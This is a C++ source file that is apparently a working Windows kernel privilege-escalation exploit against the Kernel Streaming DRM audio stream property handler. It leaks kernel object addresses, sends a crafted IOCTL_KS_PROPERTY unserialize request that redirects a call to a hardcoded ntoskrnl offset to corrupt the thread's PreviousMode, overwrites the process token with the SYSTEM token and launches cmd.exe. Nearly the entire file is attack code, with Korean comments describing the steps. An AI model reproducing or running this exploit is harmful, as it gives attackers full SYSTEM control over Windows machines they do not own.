#define __STREAMS__
#define _INC_MMREG

#include <Windows.h>
#include <winternl.h>
#include <strmif.h>
#include <ks.h>
#include <ksproxy.h>
#include <ksmedia.h>
#include <stdio.h>
#include <functiondiscovery.h>
#include <stdint.h>
#include <ntstatus.h>
#include <TlHelp32.h>
#include <processthreadsapi.h>

#define KTHREAD_PREVIOUS_MODE_OFFSET	0x232
#define SystemHandleInformation			0x10
#define SystemModuleInformation         11

#define TOKEN_SIZE              0x8

typedef struct SYSTEM_MODULE {
	ULONG                Reserved1;
	ULONG                Reserved2;
#ifdef _WIN64
	ULONG				Reserved3;
#endif
	PVOID                ImageBaseAddress;
	ULONG                ImageSize;
	ULONG                Flags;
	WORD                 Id;
	WORD                 Rank;
	WORD                 w018;
	WORD                 NameOffset;
	CHAR                 Name[255];
}SYSTEM_MODULE, * PSYSTEM_MODULE;

typedef struct SYSTEM_MODULE_INFORMATION {
	ULONG                ModulesCount;
	SYSTEM_MODULE        Modules[1];
} SYSTEM_MODULE_INFORMATION, * PSYSTEM_MODULE_INFORMATION;

typedef struct _SYSTEM_HANDLE_TABLE_ENTRY_INFO
{
	USHORT UniqueProcessId;
	USHORT CreatorBackTraceIndex;
	UCHAR ObjectTypeIndex;
	UCHAR HandleAttributes;
	USHORT HandleValue;
	PVOID Object;
	ULONG GrantedAccess;
} SYSTEM_HANDLE_TABLE_ENTRY_INFO, * PSYSTEM_HANDLE_TABLE_ENTRY_INFO;

typedef struct _SYSTEM_HANDLE_INFORMATION
{
	ULONG NumberOfHandles;
	SYSTEM_HANDLE_TABLE_ENTRY_INFO Handles[1];
} SYSTEM_HANDLE_INFORMATION, * PSYSTEM_HANDLE_INFORMATION;

__inline void* Ptr64(const unsigned long long ull)
{
	return((void*)(ULONG_PTR)ull);
}

extern "C"
{
	NTSTATUS NtWriteVirtualMemory(HANDLE ProcessHandle, PVOID BaseAddress, PVOID Buffer, ULONG NumberOfBytesToWrite, PULONG NumberOfBytesWritten OPTIONAL);
}

DEFINE_GUIDSTRUCT("3C0D501B-140B-11D1-B40F-00A0C9223196", KSPROPSETID_Service);
#define KSPROPSETID_Service DEFINE_GUIDNAMED(KSPROPSETID_Service)

#pragma pack(1)
typedef struct _EXPLOIT_DATA1
{
	PVOID Destination;  // RCX
}EXPLOIT_DATA1;

typedef struct _EXPLOIT_DATA2
{
	char pad[0x20];
	PVOID ptr_ArbitraryFunCall;
} EXPLOIT_DATA2;


int32_t GetObjPtr(_Out_ PULONG64 ppObjAddr, _In_ ULONG ulPid, _In_ HANDLE handle)
{
	int32_t Ret = -1;
	PSYSTEM_HANDLE_INFORMATION pHandleInfo = 0;
	ULONG ulBytes = 0;
	NTSTATUS Status = STATUS_SUCCESS;

	while ((Status = NtQuerySystemInformation((SYSTEM_INFORMATION_CLASS)SystemHandleInformation, pHandleInfo, ulBytes, &ulBytes)) == 0xC0000004L)
	{
		if (pHandleInfo != NULL)
		{
			pHandleInfo = (PSYSTEM_HANDLE_INFORMATION)HeapReAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, pHandleInfo, (size_t)2 * ulBytes);
		}

		else
		{
			pHandleInfo = (PSYSTEM_HANDLE_INFORMATION)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, (size_t)2 * ulBytes);
		}
	}

	if (Status != NULL)
	{
		Ret = Status;
		goto done;
	}

	for (ULONG i = 0; i < pHandleInfo->NumberOfHandles; i++)
	{
		if ((pHandleInfo->Handles[i].UniqueProcessId == ulPid) && (pHandleInfo->Handles[i].HandleValue == (unsigned short)handle))
		{
			*ppObjAddr = (unsigned long long)pHandleInfo->Handles[i].Object;
			Ret = 0;
			break;
		}
	}
done:
	if (pHandleInfo != NULL)
	{
		HeapFree(GetProcessHeap(), 0, pHandleInfo);
	}
	return Ret;
}

UINT_PTR GetKernelModuleAddress(const char* TargetModule)
{
	NTSTATUS status;
	ULONG ulBytes = 0;
	PSYSTEM_MODULE_INFORMATION handleTableInfo = NULL;

	while ((status = NtQuerySystemInformation((SYSTEM_INFORMATION_CLASS)SystemModuleInformation, handleTableInfo, ulBytes, &ulBytes)) == STATUS_INFO_LENGTH_MISMATCH)
	{
		if (handleTableInfo != NULL)
		{
			handleTableInfo = (PSYSTEM_MODULE_INFORMATION)HeapReAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, handleTableInfo, 2 * ulBytes);
		}

		else
		{
			handleTableInfo = (PSYSTEM_MODULE_INFORMATION)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, 2 * ulBytes);
		}
	}

	if (status == 0)
	{
		for (ULONG i = 0; i < handleTableInfo->ModulesCount; i++)
		{
			char* moduleName = strstr(handleTableInfo->Modules[i].Name, TargetModule);
			if (moduleName != NULL)
			{
				return (UINT_PTR)handleTableInfo->Modules[i].ImageBaseAddress;
			}
		}
	}
	else
	{
		if (handleTableInfo != NULL)
		{
			printf("[-] NtQuerySystemInformation failed. (NTSTATUS code: 0x%X)\n", status);
			HeapFree(GetProcessHeap(), 0, handleTableInfo);
			return 0;
		}
	}

	HeapFree(GetProcessHeap(), 0, handleTableInfo);

	return 0;
}

NTSTATUS Write64(void* Dst, void* Src, size_t Size)
{
	NTSTATUS Status = 0;
	PULONG cbNumOfBytesWrite = 0;

	Status = NtWriteVirtualMemory(GetCurrentProcess(), Dst, Src, Size, cbNumOfBytesWrite);
	if (!NT_SUCCESS(Status))
	{
		return -1;
	}
	return Status;
}

UCHAR InBuffer[sizeof(KSPROPERTY) + sizeof(EXPLOIT_DATA2)] = { 0 };
KSPROPERTY* pInBufProperty = (KSPROPERTY*)InBuffer;
EXPLOIT_DATA2* pInBufData = (EXPLOIT_DATA2*)(pInBufProperty + 1);

UCHAR OutBuffer[sizeof(KSPROPERTY_SERIALHDR) + sizeof(KSPROPERTY_SERIAL) + sizeof(EXPLOIT_DATA1)] = { 0 };

KSPROPERTY_SERIALHDR* pSerialHdr = (KSPROPERTY_SERIALHDR*)OutBuffer;
PKSPROPERTY_SERIAL pSerial = (KSPROPERTY_SERIAL*)(pSerialHdr + 1);
EXPLOIT_DATA1* pOutBufData = (EXPLOIT_DATA1*)(pSerial + 1);


HANDLE GetKsDevice(const GUID categories)
{
	HANDLE hDevice = 0;
	HRESULT hr = KsOpenDefaultDevice(categories, GENERIC_READ | GENERIC_WRITE, &hDevice);
	if (hr != NOERROR)
	{
		printf("[-] KsOpenDefaultDevice failed with error = %x\n", hr);
		return NULL;
	}

	printf("[+] KS device handle value = %p\n", hDevice);
	return hDevice;
}

BOOL SendIoctlReq(HANDLE hDevice)
{
	BOOL res = FALSE;
	res = DeviceIoControl(hDevice, IOCTL_KS_PROPERTY, pInBufProperty, sizeof(InBuffer), pSerialHdr, sizeof(OutBuffer), NULL, NULL);
	return res;
}

#pragma comment(lib, "Ksproxy.lib")
#pragma comment(lib, "ksuser.lib")
#pragma comment(lib, "ntdllp.lib")
#pragma comment(lib, "Advapi32.lib")

int main()
{
	HANDLE hDevice = NULL;
	BOOL res = FALSE; 
	NTSTATUS status = 0;
	uint32_t Ret = 0;

	hDevice = GetKsDevice(KSCATEGORY_DRM_DESCRAMBLE);

	uint64_t Sysproc = 0;
	uint64_t Curproc = 0;
	uint64_t Curthread = 0;

	HANDLE hCurproc = 0;
	HANDLE hThread = 0;
	
	Ret = GetObjPtr(&Sysproc, 4, (HANDLE)4);
	if (Ret != NULL)
	{
		return Ret;
	}
	printf("[+] System EPROCESS address: %llx\n", Sysproc);

	hThread = OpenThread(THREAD_QUERY_INFORMATION, TRUE, GetCurrentThreadId());
	if (hThread != NULL)
	{
		Ret = GetObjPtr(&Curthread, GetCurrentProcessId(), hThread);
		if (Ret != NULL)
		{
			return Ret;
		}
		printf("[+] Current KTHREAD address: %llx\n", Curthread);
	}

	hCurproc = OpenProcess(PROCESS_QUERY_INFORMATION, TRUE, GetCurrentProcessId());
	if (hCurproc != NULL)
	{
		Ret = GetObjPtr(&Curproc, GetCurrentProcessId(), hCurproc);
		if (Ret != NULL)
		{
			return Ret;
		}
		printf("[+] Current EPROCESS address: %llx\n", Curproc);
	}

	pInBufProperty->Set = KSPROPSETID_DrmAudioStream;
	pInBufProperty->Flags = KSPROPERTY_TYPE_UNSERIALIZESET;
	pInBufProperty->Id = 0x0;

	pSerialHdr->PropertySet = KSPROPSETID_DrmAudioStream;
	pSerialHdr->Count = 1;

	pSerial->PropertyLength = sizeof(EXPLOIT_DATA1);
	pSerial->Id = 0;
	pSerial->PropTypeSet.Set = KSPROPSETID_DrmAudioStream;
	pSerial->PropTypeSet.Flags = 0;
	pSerial->PropTypeSet.Id = 0x45;

	UINT_PTR nt_base = GetKernelModuleAddress("ntoskrnl.exe");

	// 1. 공격 대상 주소 계산
	uint64_t previous_mode_addr = (uint64_t)Curthread + 0x232;
	uint64_t indirect_pointer_value = previous_mode_addr + 0x30; 

	// 2. 가상 메모리 할당 (rcx = 0x10000000)
	void* fake_rcx = (void*)0x10000000;
	VirtualAlloc(fake_rcx, 0x1000, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	memset(fake_rcx, 0, 0x1000);

	// 3. fake_rcx가 가리키는 곳에 간접 주소 설정
	*(uint64_t*)fake_rcx = indirect_pointer_value;

	// 4. 구조체에 인자 주입
	pOutBufData->Destination = Ptr64((uint64_t)fake_rcx);
  // ntoskrnl.exe 내 ExpProfileDelete 주소 하드 코딩 
	pInBufData->ptr_ArbitraryFunCall = Ptr64(nt_base + 0xA023D0);    

	printf("[+] ptr_ArbitraryFunCall (jmp rax) = %p\n", pInBufData->ptr_ArbitraryFunCall);

	res = SendIoctlReq(hDevice);
	if (!res)
	{
		printf("[-] SendIoctlReq failed\n");
	}

	char mode = 1;

	Write64(Ptr64(Curproc + 0x4b8), Ptr64(Sysproc + 0x4b8), TOKEN_SIZE); // eprocess token offset : 0x4b8
	Write64(Ptr64(Curthread + 0x232), &mode, sizeof(mode)); // previousMode offset : 0x232

	system("cmd.exe");

	return 0;
}
